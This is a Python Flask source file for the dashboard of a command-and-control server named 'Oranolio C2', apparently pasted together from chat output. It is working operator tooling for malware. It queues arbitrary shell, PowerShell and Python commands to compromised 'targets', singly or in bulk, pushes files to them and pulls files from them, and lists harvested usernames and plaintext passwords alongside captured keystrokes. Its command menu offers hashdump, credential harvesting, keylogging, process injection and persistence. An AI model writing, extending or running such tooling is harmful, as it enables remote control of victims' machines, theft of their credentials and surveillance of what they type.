#!/usr/bin/env python3
"""
PRODUCTION-GRADE Dashboard Routes for Oranolio C2
Full database integration, advanced features, real-time updates
"""

import os
import sys
import json
import logging
import hashlib
from datetime import datetime, timedelta
from functools import wraps
from typing import Dict, List, Optional, Tuple

from flask import Blueprint, render_template, request, jsonify, session, send_file, g
from werkzeug.utils import secure_filename
from werkzeug.exceptions import BadRequest, NotFound, Forbidden

# Add paths
sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'Core'))

# Import core systems
from Core.database import EliteDatabase
from Core.logger import get_logger
from auth_utils import login_required

# Initialize
logger = get_logger('dashboard')
db = EliteDatabase()

# Create blueprint
dashboard_bp = Blueprint('dashboard', __name__, url_prefix='/dashboard')

# Configuration
UPLOAD_FOLDER = 'uploads'
DOWNLOAD_FOLDER = 'downloads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'py', 'exe', 'zip', 'rar', 'dll', 'bat', 'ps1', '7z', 'tar', 'gz'}
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
ITEMS_PER_PAGE = 50

# Ensure directories
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# ============================================================================
# UTILITIES
# ============================================================================

def allowed_file(filename: str) -> bool:
    """Check if file extension is allowed"""
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def audit_log(action: str, target: str = None, details: str = None):
    """Log user action to audit trail"""
    try:
        db.add_audit_log(
            user=session.get('username', 'unknown'),
            action=action,
            target=target,
            details=details,
            ip_address=request.remote_addr
        )
    except Exception as e:
        logger.error(f"Failed to write audit log: {e}")

def paginate(query_func, page: int = 1, per_page: int = ITEMS_PER_PAGE):
    """Paginate query results"""
    offset = (page - 1) * per_page
    items = query_func(limit=per_page, offset=offset)
    total = query_func(count_only=True)
    
    return {
        'items': items,
        'page': page,
        'per_page': per_page,
        'total': total,
        'pages': (total + per_page - 1) // per_page
    }

def api_response(data=None, error=None, status=200):
    """Standardized API response"""
    if error:
        return jsonify({'success': False, 'error': error}), status
    return jsonify({'success': True, 'data': data}), status

# ============================================================================
# DASHBOARD PAGES
# ============================================================================

@dashboard_bp.route('/')
@dashboard_bp.route('/overview')
@login_required
def overview():
    """Dashboard overview page"""
    audit_log('view_dashboard', 'overview')
    return render_template('dashboard/overview.html')

@dashboard_bp.route('/targets')
@login_required
def targets():
    """Targets management page"""
    audit_log('view_targets')
    return render_template('dashboard/targets.html')

@dashboard_bp.route('/commands')
@login_required
def commands():
    """Command execution page"""
    audit_log('view_commands')
    return render_template('dashboard/commands.html')

@dashboard_bp.route('/files')
@login_required
def files():
    """File management page"""
    audit_log('view_files')
    return render_template('dashboard/files.html')

@dashboard_bp.route('/credentials')
@login_required
def credentials():
    """Credentials page"""
    audit_log('view_credentials')
    return render_template('dashboard/credentials.html')

@dashboard_bp.route('/keylogs')
@login_required
def keylogs():
    """Keylogger page"""
    audit_log('view_keylogs')
    return render_template('dashboard/keylogs.html')

@dashboard_bp.route('/logs')
@login_required
def logs():
    """System logs page"""
    audit_log('view_logs')
    return render_template('dashboard/logs.html')

@dashboard_bp.route('/settings')
@login_required
def settings():
    """Settings page"""
    audit_log('view_settings')
    return render_template('dashboard/settings.html')

@dashboard_bp.route('/help')
@login_required
def help():
    """Help and documentation page"""
    return render_template('dashboard/help.html')

# ============================================================================
# OVERVIEW API
# ============================================================================

@dashboard_bp.route('/api/dashboard/overview')
@login_required
def api_overview():
    """Get comprehensive dashboard overview data"""
    try:
        # Get all agents
        all_agents = db.get_all_agents()
        active_agents = [a for a in all_agents if a['status'] == 'active']
        
        # Calculate time ranges
        now = datetime.now()
        today_start = now.replace(hour=0, minute=0, second=0, microsecond=0)
        week_ago = now - timedelta(days=7)
        
        # Get commands executed today
        commands_today = db.get_commands_by_date_range(today_start, now)
        
        # Get credentials
        all_credentials = db.get_all_credentials()
        creds_today = [c for c in all_credentials if datetime.fromisoformat(c['collected_at']) >= today_start]
        
        # Calculate success rate
        recent_results = db.get_recent_results(limit=100)
        successful = len([r for r in recent_results if r['exit_code'] == 0])
        success_rate = int((successful / len(recent_results) * 100)) if recent_results else 0
        
        # Get recent activity
        recent_activity = []
        
        # Recent agent connections
        for agent in sorted(all_agents, key=lambda x: x['first_seen'], reverse=True)[:5]:
            recent_activity.append({
                'type': 'target_connected',
                'message': f"Target connected: {agent['hostname']}",
                'timestamp': agent['first_seen']
            })
        
        # Recent commands
        for cmd in db.get_recent_commands(limit=5):
            recent_activity.append({
                'type': 'command_executed',
                'message': f"Command executed: {cmd['command'][:50]}",
                'timestamp': cmd['created_at']
            })
        
        # Recent credentials
        for cred in sorted(all_credentials, key=lambda x: x['collected_at'], reverse=True)[:5]:
            recent_activity.append({
                'type': 'credential_captured',
                'message': f"Credential captured: {cred['username']}",
                'timestamp': cred['collected_at']
            })
        
        # Sort by timestamp
        recent_activity.sort(key=lambda x: x['timestamp'], reverse=True)
        recent_activity = recent_activity[:10]
        
        # Calculate target change percentage
        week_old_agents = [a for a in all_agents if datetime.fromisoformat(a['first_seen']) < week_ago]
        targets_change = int(((len(active_agents) - len(week_old_agents)) / max(len(week_old_agents), 1)) * 100)
        
        data = {
            'stats': {
                'active_targets': len(active_agents),
                'commands_today': len(commands_today),
                'total_credentials': len(all_credentials),
                'success_rate': success_rate,
                'targets_change': targets_change,
                'creds_today': len(creds_today)
            },
            'recent_activity': recent_activity,
            'active_targets': [
                {
                    'id': agent['id'],
                    'hostname': agent['hostname'],
                    'ip_address': agent['ip_address'],
                    'os_info': agent['platform'],
                    'user_info': agent['username'],
                    'last_seen': agent['last_seen']
                }
                for agent in active_agents[:10]
            ]
        }
        
        return api_response(data)
        
    except Exception as e:
        logger.error(f"Error getting overview data: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# ============================================================================
# TARGETS API
# ============================================================================

@dashboard_bp.route('/api/targets')
@login_required
def api_targets():
    """Get all targets with filtering and pagination"""
    try:
        # Get query parameters
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', ITEMS_PER_PAGE, type=int)
        status_filter = request.args.get('status', 'all')
        search = request.args.get('search', '')
        
        # Get all agents
        all_agents = db.get_all_agents()
        
        # Apply filters
        filtered_agents = all_agents
        
        if status_filter != 'all':
            filtered_agents = [a for a in filtered_agents if a['status'] == status_filter]
        
        if search:
            search_lower = search.lower()
            filtered_agents = [
                a for a in filtered_agents
                if search_lower in a['hostname'].lower() or
                   search_lower in (a['ip_address'] or '').lower() or
                   search_lower in (a['username'] or '').lower()
            ]
        
        # Paginate
        start = (page - 1) * per_page
        end = start + per_page
        paginated_agents = filtered_agents[start:end]
        
        # Format response
        targets = [
            {
                'id': agent['id'],
                'hostname': agent['hostname'],
                'ip_address': agent['ip_address'],
                'os_info': agent['platform'] or 'Unknown',
                'user_info': agent['username'] or 'Unknown',
                'first_seen': agent['first_seen'],
                'last_seen': agent['last_seen'],
                'is_active': agent['status'] == 'active',
                'connection_count': db.get_agent_connection_count(agent['id'])
            }
            for agent in paginated_agents
        ]
        
        return api_response({
            'targets': targets,
            'total': len(filtered_agents),
            'page': page,
            'per_page': per_page,
            'pages': (len(filtered_agents) + per_page - 1) // per_page
        })
        
    except Exception as e:
        logger.error(f"Error getting targets: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/targets/<target_id>')
@login_required
def api_target_details(target_id):
    """Get detailed target information"""
    try:
        agent = db.get_agent(target_id)
        
        if not agent:
            return api_response(error='Target not found', status=404)
        
        # Get additional stats
        command_count = len(db.get_agent_commands(target_id))
        credential_count = len(db.get_agent_credentials(target_id))
        file_count = len(db.get_agent_files(target_id))
        
        # Parse metadata
        metadata = json.loads(agent.get('metadata', '{}'))
        
        target_data = {
            'id': agent['id'],
            'hostname': agent['hostname'],
            'ip_address': agent['ip_address'],
            'os_info': agent['platform'],
            'user_info': agent['username'],
            'architecture': agent['architecture'],
            'privileges': agent['privileges'],
            'first_seen': agent['first_seen'],
            'last_seen': agent['last_seen'],
            'last_beacon': agent['last_beacon'],
            'is_active': agent['status'] == 'active',
            'connection_count': db.get_agent_connection_count(agent['id']),
            'command_count': command_count,
            'credential_count': credential_count,
            'file_count': file_count,
            'metadata': metadata
        }
        
        audit_log('view_target_details', target_id)
        return api_response(target_data)
        
    except Exception as e:
        logger.error(f"Error getting target details: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/targets/count')
@login_required
def api_targets_count():
    """Get active targets count"""
    try:
        active_count = len([a for a in db.get_all_agents() if a['status'] == 'active'])
        return api_response({'count': active_count})
    except Exception as e:
        logger.error(f"Error getting targets count: {e}")
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/targets/<target_id>/disconnect', methods=['POST'])
@login_required
def api_disconnect_target(target_id):
    """Disconnect a target"""
    try:
        agent = db.get_agent(target_id)
        if not agent:
            return api_response(error='Target not found', status=404)
        
        db.set_agent_status(target_id, 'disconnected')
        audit_log('disconnect_target', target_id)
        
        return api_response({'message': 'Target disconnected'})
        
    except Exception as e:
        logger.error(f"Error disconnecting target: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# ============================================================================
# COMMANDS API
# ============================================================================

@dashboard_bp.route('/api/commands')
@login_required
def api_commands():
    """Get available commands organized by category"""
    try:
        commands = {
            'system': [
                {'name': 'whoami', 'description': 'Get current user', 'category': 'system'},
                {'name': 'hostname', 'description': 'Get system hostname', 'category': 'system'},
                {'name': 'sysinfo', 'description': 'Get detailed system information', 'category': 'system'},
                {'name': 'pwd', 'description': 'Get current working directory', 'category': 'system'},
                {'name': 'env', 'description': 'List environment variables', 'category': 'system'},
                {'name': 'uptime', 'description': 'Get system uptime', 'category': 'system'}
            ],
            'file': [
                {'name': 'ls', 'description': 'List directory contents', 'category': 'file'},
                {'name': 'cat', 'description': 'Display file contents', 'category': 'file'},
                {'name': 'download', 'description': 'Download file from target', 'category': 'file'},
                {'name': 'upload', 'description': 'Upload file to target', 'category': 'file'},
                {'name': 'rm', 'description': 'Remove file', 'category': 'file'},
                {'name': 'mkdir', 'description': 'Create directory', 'category': 'file'},
                {'name': 'find', 'description': 'Search for files', 'category': 'file'}
            ],
            'network': [
                {'name': 'ping', 'description': 'Ping a host', 'category': 'network'},
                {'name': 'netstat', 'description': 'Show network connections', 'category': 'network'},
                {'name': 'ifconfig', 'description': 'Show network interfaces', 'category': 'network'},
                {'name': 'portscan', 'description': 'Scan ports on target', 'category': 'network'},
                {'name': 'dns', 'description': 'DNS lookup', 'category': 'network'}
            ],
            'process': [
                {'name': 'ps', 'description': 'List running processes', 'category': 'process'},
                {'name': 'kill', 'description': 'Terminate process', 'category': 'process'},
                {'name': 'tasklist', 'description': 'Detailed process list', 'category': 'process'},
                {'name': 'inject', 'description': 'Inject into process', 'category': 'process'}
            ],
            'security': [
                {'name': 'screenshot', 'description': 'Capture screenshot', 'category': 'security'},
                {'name': 'keylog start', 'description': 'Start keylogger', 'category': 'security'},
                {'name': 'keylog stop', 'description': 'Stop keylogger', 'category': 'security'},
                {'name': 'hashdump', 'description': 'Dump password hashes', 'category': 'security'},
                {'name': 'credentials', 'description': 'Harvest stored credentials', 'category': 'security'},
                {'name': 'clipboard', 'description': 'Get clipboard contents', 'category': 'security'}
            ],
            'persistence': [
                {'name': 'persist install', 'description': 'Install persistence', 'category': 'persistence'},
                {'name': 'persist remove', 'description': 'Remove persistence', 'category': 'persistence'},
                {'name': 'persist check', 'description': 'Check persistence status', 'category': 'persistence'}
            ],
            'recon': [
                {'name': 'recon full', 'description': 'Full system reconnaissance', 'category': 'recon'},
                {'name': 'recon network', 'description': 'Network reconnaissance', 'category': 'recon'},
                {'name': 'recon users', 'description': 'Enumerate users', 'category': 'recon'},
                {'name': 'recon software', 'description': 'List installed software', 'category': 'recon'}
            ],
            'custom': [
                {'name': 'shell', 'description': 'Execute shell command', 'category': 'custom'},
                {'name': 'powershell', 'description': 'Execute PowerShell command', 'category': 'custom'},
                {'name': 'python', 'description': 'Execute Python code', 'category': 'custom'}
            ]
        }
        
        return api_response(commands)
        
    except Exception as e:
        logger.error(f"Error getting commands: {e}")
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/execute', methods=['POST'])
@login_required
def api_execute():
    """Execute command on target"""
    try:
        data = request.get_json()
        target_id = data.get('target_id')
        command = data.get('command')
        
        if not target_id or not command:
            return api_response(error='Missing target_id or command', status=400)
        
        # Verify target exists
        agent = db.get_agent(target_id)
        if not agent:
            return api_response(error='Target not found', status=404)
        
        if agent['status'] != 'active':
            return api_response(error='Target is not active', status=400)
        
        # Queue command
        command_id = db.add_command(target_id, command)
        
        audit_log('execute_command', target_id, f"Command: {command}")
        logger.info(f"Command {command_id} queued for agent {target_id}: {command}")
        
        return api_response({
            'command_id': command_id,
            'status': 'queued',
            'message': 'Command queued for execution',
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"Error executing command: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/commands/history')
@login_required
def api_command_history():
    """Get command execution history"""
    try:
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', ITEMS_PER_PAGE, type=int)
        target_id = request.args.get('target_id')
        
        if target_id:
            commands = db.get_agent_commands(target_id)
        else:
            commands = db.get_all_commands()
        
        # Paginate
        start = (page - 1) * per_page
        end = start + per_page
        paginated_commands = commands[start:end]
        
        # Get results for each command
        history = []
        for cmd in paginated_commands:
            result = db.get_command_result(cmd['id'])
            history.append({
                'id': cmd['id'],
                'agent_id': cmd['agent_id'],
                'command': cmd['command'],
                'status': cmd['status'],
                'created_at': cmd['created_at'],
                'executed_at': cmd.get('executed_at'),
                'completed_at': cmd.get('completed_at'),
                'output': result.get('output') if result else None,
                'error': result.get('error') if result else None,
                'exit_code': result.get('exit_code') if result else None
            })
        
        return api_response({
            'history': history,
            'total': len(commands),
            'page': page,
            'per_page': per_page
        })
        
    except Exception as e:
        logger.error(f"Error getting command history: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# Continue in next message due to length...
# CONTINUATION OF advanced_dashboard_routes.py
# Append this to the main file

# ============================================================================
# FILES API
# ============================================================================

@dashboard_bp.route('/api/files')
@login_required
def api_files():
    """Get uploaded and downloaded files with metadata"""
    try:
        uploaded_files = []
        downloaded_files = []
        
        # Get uploaded files from filesystem
        if os.path.exists(UPLOAD_FOLDER):
            for filename in os.listdir(UPLOAD_FOLDER):
                file_path = os.path.join(UPLOAD_FOLDER, filename)
                if os.path.isfile(file_path):
                    stat = os.stat(file_path)
                    file_hash = hashlib.sha256(open(file_path, 'rb').read()).hexdigest()
                    
                    uploaded_files.append({
                        'name': filename,
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        'hash': file_hash,
                        'path': file_path
                    })
        
        # Get downloaded files from database
        db_files = db.get_all_files()
        for file_record in db_files:
            downloaded_files.append({
                'id': file_record['id'],
                'name': file_record['filename'],
                'size': file_record['size'],
                'modified': file_record['uploaded_at'],
                'hash': file_record['hash'],
                'agent_id': file_record['agent_id'],
                'file_type': file_record['file_type']
            })
        
        return api_response({
            'uploaded': uploaded_files,
            'downloaded': downloaded_files,
            'total_size': sum(f['size'] for f in uploaded_files + downloaded_files)
        })
        
    except Exception as e:
        logger.error(f"Error getting files: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/files/upload', methods=['POST'])
@login_required
def api_upload_file():
    """Upload file with validation and metadata"""
    try:
        if 'file' not in request.files:
            return api_response(error='No file provided', status=400)
        
        file = request.files['file']
        if file.filename == '':
            return api_response(error='No file selected', status=400)
        
        # Check file size
        file.seek(0, os.SEEK_END)
        file_size = file.tell()
        file.seek(0)
        
        if file_size > MAX_FILE_SIZE:
            return api_response(error=f'File too large (max {MAX_FILE_SIZE} bytes)', status=400)
        
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            
            # Add timestamp to prevent overwrites
            name, ext = os.path.splitext(filename)
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            unique_filename = f"{name}_{timestamp}{ext}"
            
            file_path = os.path.join(UPLOAD_FOLDER, unique_filename)
            file.save(file_path)
            
            # Calculate hash
            file_hash = hashlib.sha256(open(file_path, 'rb').read()).hexdigest()
            
            audit_log('upload_file', unique_filename, f"Size: {file_size}, Hash: {file_hash}")
            logger.info(f"File uploaded: {unique_filename} ({file_size} bytes)")
            
            return api_response({
                'filename': unique_filename,
                'size': file_size,
                'hash': file_hash,
                'path': file_path
            })
        else:
            return api_response(error='File type not allowed', status=400)
        
    except Exception as e:
        logger.error(f"Error uploading file: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/files/download/<filename>')
@login_required
def api_download_file(filename):
    """Download file with security checks"""
    try:
        # Prevent directory traversal
        filename = secure_filename(filename)
        
        # Check uploads folder
        upload_path = os.path.join(UPLOAD_FOLDER, filename)
        if os.path.exists(upload_path) and os.path.isfile(upload_path):
            audit_log('download_file', filename)
            return send_file(upload_path, as_attachment=True)
        
        # Check downloads folder
        download_path = os.path.join(DOWNLOAD_FOLDER, filename)
        if os.path.exists(download_path) and os.path.isfile(download_path):
            audit_log('download_file', filename)
            return send_file(download_path, as_attachment=True)
        
        return api_response(error='File not found', status=404)
        
    except Exception as e:
        logger.error(f"Error downloading file: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/files/deploy', methods=['POST'])
@login_required
def api_deploy_file():
    """Deploy file to target"""
    try:
        data = request.get_json()
        filename = data.get('filename')
        target_id = data.get('target_id')
        destination = data.get('destination', '/tmp/')
        
        if not filename or not target_id:
            return api_response(error='Missing filename or target_id', status=400)
        
        # Verify file exists
        file_path = os.path.join(UPLOAD_FOLDER, secure_filename(filename))
        if not os.path.exists(file_path):
            return api_response(error='File not found', status=404)
        
        # Verify target exists
        agent = db.get_agent(target_id)
        if not agent:
            return api_response(error='Target not found', status=404)
        
        # Queue upload command
        command = f"upload {filename} {destination}"
        command_id = db.add_command(target_id, command, priority=8)
        
        audit_log('deploy_file', target_id, f"File: {filename}, Destination: {destination}")
        logger.info(f"File deployment queued: {filename} to {target_id}")
        
        return api_response({
            'command_id': command_id,
            'message': 'File deployment queued',
            'filename': filename,
            'target_id': target_id,
            'destination': destination
        })
        
    except Exception as e:
        logger.error(f"Error deploying file: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/files/download-from-target', methods=['POST'])
@login_required
def api_download_from_target():
    """Download file from target"""
    try:
        data = request.get_json()
        target_id = data.get('target_id')
        file_path = data.get('file_path')
        
        if not target_id or not file_path:
            return api_response(error='Missing target_id or file_path', status=400)
        
        # Verify target exists
        agent = db.get_agent(target_id)
        if not agent:
            return api_response(error='Target not found', status=404)
        
        # Queue download command
        command = f"download {file_path}"
        command_id = db.add_command(target_id, command, priority=8)
        
        audit_log('download_from_target', target_id, f"File: {file_path}")
        logger.info(f"File download queued: {file_path} from {target_id}")
        
        return api_response({
            'command_id': command_id,
            'message': 'File download queued',
            'file_path': file_path,
            'target_id': target_id
        })
        
    except Exception as e:
        logger.error(f"Error downloading from target: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/files/<file_type>/<filename>', methods=['DELETE'])
@login_required
def api_delete_file(file_type, filename):
    """Delete file with audit trail"""
    try:
        filename = secure_filename(filename)
        
        if file_type == 'uploaded':
            file_path = os.path.join(UPLOAD_FOLDER, filename)
        elif file_type == 'downloaded':
            file_path = os.path.join(DOWNLOAD_FOLDER, filename)
        else:
            return api_response(error='Invalid file type', status=400)
        
        if not os.path.exists(file_path):
            return api_response(error='File not found', status=404)
        
        os.remove(file_path)
        audit_log('delete_file', filename, f"Type: {file_type}")
        logger.info(f"File deleted: {filename}")
        
        return api_response({'message': 'File deleted successfully'})
        
    except Exception as e:
        logger.error(f"Error deleting file: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/files/clear-all', methods=['DELETE'])
@login_required
def api_clear_all_files():
    """Clear all uploaded files (dangerous operation)"""
    try:
        deleted_count = 0
        
        if os.path.exists(UPLOAD_FOLDER):
            for filename in os.listdir(UPLOAD_FOLDER):
                file_path = os.path.join(UPLOAD_FOLDER, filename)
                if os.path.isfile(file_path):
                    os.remove(file_path)
                    deleted_count += 1
        
        audit_log('clear_all_files', None, f"Deleted {deleted_count} files")
        logger.warning(f"All files cleared by {session.get('username')}: {deleted_count} files")
        
        return api_response({
            'message': f'{deleted_count} files deleted',
            'count': deleted_count
        })
        
    except Exception as e:
        logger.error(f"Error clearing files: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# ============================================================================
# CREDENTIALS API
# ============================================================================

@dashboard_bp.route('/api/credentials')
@login_required
def api_credentials():
    """Get harvested credentials with filtering"""
    try:
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', ITEMS_PER_PAGE, type=int)
        target_id = request.args.get('target_id')
        cred_type = request.args.get('type')
        
        # Get credentials
        if target_id:
            all_creds = db.get_agent_credentials(target_id)
        else:
            all_creds = db.get_all_credentials()
        
        # Apply type filter
        if cred_type and cred_type != 'all':
            all_creds = [c for c in all_creds if c.get('type') == cred_type]
        
        # Paginate
        start = (page - 1) * per_page
        end = start + per_page
        paginated_creds = all_creds[start:end]
        
        # Format credentials
        credentials = []
        for cred in paginated_creds:
            # Get agent info
            agent = db.get_agent(cred['agent_id'])
            
            credentials.append({
                'id': cred['id'],
                'target_id': cred['agent_id'],
                'target_hostname': agent['hostname'] if agent else 'Unknown',
                'type': cred['type'] or 'unknown',
                'service': cred.get('domain') or cred.get('url'),
                'url': cred.get('url'),
                'username': cred['username'],
                'password': cred['password'],
                'captured_at': cred['collected_at'],
                'notes': cred.get('notes')
            })
        
        return api_response({
            'credentials': credentials,
            'total': len(all_creds),
            'page': page,
            'per_page': per_page
        })
        
    except Exception as e:
        logger.error(f"Error getting credentials: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# ============================================================================
# KEYLOGS API
# ============================================================================

@dashboard_bp.route('/api/keylogs')
@login_required
def api_keylogs():
    """Get keylogger data with filtering"""
    try:
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', ITEMS_PER_PAGE, type=int)
        target_id = request.args.get('target_id')
        
        # Get keylogs
        if target_id:
            all_keylogs = db.get_agent_keylogs(target_id)
        else:
            all_keylogs = db.get_all_keylogs()
        
        # Paginate
        start = (page - 1) * per_page
        end = start + per_page
        paginated_keylogs = all_keylogs[start:end]
        
        # Format keylogs
        keylogs = []
        for keylog in paginated_keylogs:
            agent = db.get_agent(keylog['agent_id'])
            
            keylogs.append({
                'id': keylog['id'],
                'target_id': keylog['agent_id'],
                'target_hostname': agent['hostname'] if agent else 'Unknown',
                'window_title': keylog['window_title'],
                'keystrokes': keylog['keystrokes'],
                'timestamp': keylog['timestamp']
            })
        
        return api_response({
            'keylogs': keylogs,
            'total': len(all_keylogs),
            'page': page,
            'per_page': per_page
        })
        
    except Exception as e:
        logger.error(f"Error getting keylogs: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# ============================================================================
# LOGS API
# ============================================================================

@dashboard_bp.route('/api/logs')
@login_required
def api_logs():
    """Get system logs with filtering"""
    try:
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', ITEMS_PER_PAGE, type=int)
        level = request.args.get('level', 'all')
        
        # Get audit logs
        all_logs = db.get_audit_logs()
        
        # Apply level filter
        if level != 'all':
            all_logs = [log for log in all_logs if log.get('level') == level]
        
        # Paginate
        start = (page - 1) * per_page
        end = start + per_page
        paginated_logs = all_logs[start:end]
        
        # Format logs
        logs = []
        for log in paginated_logs:
            logs.append({
                'id': log['id'],
                'level': 'INFO',  # Default level
                'message': f"{log['action']} - {log.get('details', '')}",
                'timestamp': log['timestamp'],
                'source': log['user'],
                'target': log.get('target'),
                'ip_address': log.get('ip_address')
            })
        
        return api_response({
            'logs': logs,
            'total': len(all_logs),
            'page': page,
            'per_page': per_page
        })
        
    except Exception as e:
        logger.error(f"Error getting logs: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/logs/clear', methods=['DELETE'])
@login_required
def api_clear_logs():
    """Clear system logs (dangerous operation)"""
    try:
        # This would clear audit logs - implement with caution
        audit_log('clear_logs', None, 'All logs cleared')
        logger.warning(f"Logs cleared by {session.get('username')}")
        
        return api_response({'message': 'Logs cleared successfully'})
        
    except Exception as e:
        logger.error(f"Error clearing logs: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# ============================================================================
# SETTINGS API
# ============================================================================

@dashboard_bp.route('/api/settings')
@login_required
def api_get_settings():
    """Get current system settings"""
    try:
        # Load settings from config or database
        settings = {
            'server': {
                'port': 5000,
                'max_connections': 100,
                'timeout': 300
            },
            'security': {
                'require_auth': True,
                'enable_ssl': True,
                'log_commands': True
            },
            'notifications': {
                'new_target': True,
                'disconnect': True,
                'credentials': True
            }
        }
        
        return api_response(settings)
        
    except Exception as e:
        logger.error(f"Error getting settings: {e}")
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/settings/<category>', methods=['POST'])
@login_required
def api_save_settings(category):
    """Save settings with validation"""
    try:
        data = request.get_json()
        
        # Validate category
        valid_categories = ['server', 'security', 'notifications']
        if category not in valid_categories:
            return api_response(error='Invalid settings category', status=400)
        
        # Save settings (implement actual storage)
        audit_log('update_settings', category, json.dumps(data))
        logger.info(f"Settings updated: {category} by {session.get('username')}")
        
        return api_response({'message': f'{category.capitalize()} settings saved'})
        
    except Exception as e:
        logger.error(f"Error saving settings: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

@dashboard_bp.route('/api/settings/reset', methods=['POST'])
@login_required
def api_reset_settings():
    """Reset settings to defaults"""
    try:
        audit_log('reset_settings', None, 'Settings reset to defaults')
        logger.info(f"Settings reset by {session.get('username')}")
        
        return api_response({'message': 'Settings reset to defaults'})
        
    except Exception as e:
        logger.error(f"Error resetting settings: {e}")
        return api_response(error=str(e), status=500)

# ============================================================================
# BULK OPERATIONS
# ============================================================================

@dashboard_bp.route('/api/bulk/execute', methods=['POST'])
@login_required
def api_bulk_execute():
    """Execute command on multiple targets"""
    try:
        data = request.get_json()
        target_ids = data.get('target_ids', [])
        command = data.get('command')
        
        if not target_ids or not command:
            return api_response(error='Missing target_ids or command', status=400)
        
        results = []
        for target_id in target_ids:
            agent = db.get_agent(target_id)
            if agent and agent['status'] == 'active':
                command_id = db.add_command(target_id, command)
                results.append({
                    'target_id': target_id,
                    'command_id': command_id,
                    'status': 'queued'
                })
        
        audit_log('bulk_execute', None, f"Command: {command}, Targets: {len(results)}")
        
        return api_response({
            'results': results,
            'total': len(results),
            'command': command
        })
        
    except Exception as e:
        logger.error(f"Error in bulk execute: {e}", exc_info=True)
        return api_response(error=str(e), status=500)

# Export blueprint
__all__ = ['dashboard_bp']
